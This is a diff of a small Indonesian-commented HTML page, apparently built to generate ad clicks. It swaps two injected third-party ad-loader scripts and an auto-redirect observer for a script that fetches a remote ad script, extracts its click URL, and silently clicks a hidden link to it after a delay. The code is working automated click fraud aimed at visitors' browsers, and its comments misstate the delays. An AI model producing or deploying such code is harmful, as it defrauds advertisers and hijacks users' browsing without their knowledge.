@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Klik Vast Ad</title>
+  <title></title>
   <style>
     html, body {
       margin: 0;
@@ -13,55 +13,35 @@
   </style>
 </head>
 <body>
-  <!-- Inject script iklan pertama -->
-  <script>
-    (function(zptrm){
-      var d = document,
-          s = d.createElement('script'),
-          l = d.scripts[d.scripts.length - 1];
-      s.settings = zptrm || {};
-      s.src = "\/\/beneficial-shape.com\/bKXAV.sMdfG\/la0\/YlW\/cT\/bebmV9Gu\/ZcUHlnknPNTDYT2\/NUTTUG3jOwD\/cStVNojEYt1\/N\/TlcZ4jOAAU";
-      s.async = true;
-      s.referrerPolicy = 'no-referrer-when-downgrade';
-      l.parentNode.insertBefore(s, l);
-    })({})
-  </script>
 
-  <!-- Inject script iklan kedua -->
-  <script>
-    (function(lnul){
-      var d = document,
-          s = d.createElement('script'),
-          l = d.scripts[d.scripts.length - 1];
-      s.settings = lnul || {};
-      s.src = "\/\/fitting-candle.com\/c\/DL9.6-bA2M5lljSfWLQW9UN\/jaYp1iOJDzEAxqOGC_0n2\/NtjLUm4wMrTEER5D";
-      s.async = true;
-      s.referrerPolicy = 'no-referrer-when-downgrade';
-      l.parentNode.insertBefore(s, l);
-    })({})
-  </script>
+<script>
+  // URL script eksternal
+  const scriptURL = "//disfiguredcomment.com/biX_Vis.dQG/lL0/YYWCcW/Le/mB9yu/ZRUTlXkKPDTHYr2NNDTbkS1kNQTbcItlNdjhYU1uOFTBUj1PO/Al";
 
-  <!-- Observer untuk auto buka semua link vast-blocker di halaman yang sama -->
-  <script>
-    const opened = new Set();
+  fetch(scriptURL)
+    .then(response => response.text())
+    .then(jsCode => {
+      // Cari pattern "clickUrl":"..."
+      const match = jsCode.match(/"clickUrl"\s*:\s*"([^"]+)"/);
+      if (match && match[1]) {
+        const clickUrl = match[1];
+        console.log("clickUrl ditemukan:", clickUrl);
+        // Tunggu 9 detik sebelum klik (di tab yang sama)
+        setTimeout(() => {
+          const a = document.createElement("a");
+          a.href = clickUrl;            // set tujuan dari clickUrl
+          // jangan set a.target supaya klik terjadi di tab yang sama
+          a.style.display = "none";     // biar gak kelihatan di DOM
+          document.body.appendChild(a);
+          a.click();
+          a.remove();                   // hapus link supaya bersih
+        }, 4000);
+      } else {
+        console.warn("clickUrl tidak ditemukan di script");
+      }
+    })
+    .catch(err => console.error("Gagal fetch script:", err));
+</script>
 
-    const observer = new MutationObserver(() => {
-      const links = document.querySelectorAll('a.vast-blocker[href]');
-      links.forEach(link => {
-        if (!opened.has(link.href)) {
-          opened.add(link.href);
-          // tunggu 7 detik sebelum buka di halaman yang sama
-          setTimeout(() => {
-            window.location.href = link.href;
-          }, 9000);
-        }
-      });
-    });
-
-    observer.observe(document.body, {
-      childList: true,
-      subtree: true
-    });
-  </script>
 </body>
 </html>
